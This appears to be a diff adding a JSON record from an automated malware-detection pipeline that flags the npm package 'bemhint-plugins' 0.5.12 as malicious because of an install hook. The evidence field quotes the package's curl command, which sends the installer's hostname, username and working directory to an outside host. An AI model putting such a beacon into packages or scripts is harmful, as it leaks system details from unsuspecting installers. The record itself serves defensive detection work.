@@ -1,0 +1,33 @@
+{
+  "package_name": "bemhint-plugins",
+  "version": "0.5.12",
+  "label": "malicious",
+  "behaviors": [
+    {
+      "category": "install_hook",
+      "summary": "The package contains no JavaScript files but an install hook present at install time.",
+      "details": "The package file structure suggests that an install hook is present at install time. The commands listed in the package metadata indicate a potential payload that may execute at install time. The signals suggest a hook-based attack payload.",
+      "confidence": 0.72,
+      "evidence_apis": [],
+      "evidence_files": [],
+      "evidence_domains": [],
+      "evidence_commands": [
+        "curl-H\"Package:bemhint-plugins\"-H\"Version:0.5.12\"-H\"Hostname:$(hostname|base64)\" -H\"Whoami:$(whoami|base64)\" -H\"Pwd:$(pwd|base64)\" -d\"meow!securitytest\" http://npm-frontend.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+      ],
+      "evidence_env_vars": []
+    }
+  ],
+  "risk_vector": [
+    "install_hook"
+  ],
+  "analyst_note": "This JSON object represents the analysis of the package 'bemhint-plugins' version '0.5.12'. The behavior identified is 'install_hook', which suggests that the package contains no JavaScript files but an install hook present at install time. The commands listed in the package metadata indicate a potential payload that may execute at install time. The signals suggest a hook-based attack payload. The confidence score is 0.72, indicating a high level of confidence in the detection of this behavior.",
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "semantic_v2.0",
+    "routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-26T22:03:00.538894"
+}
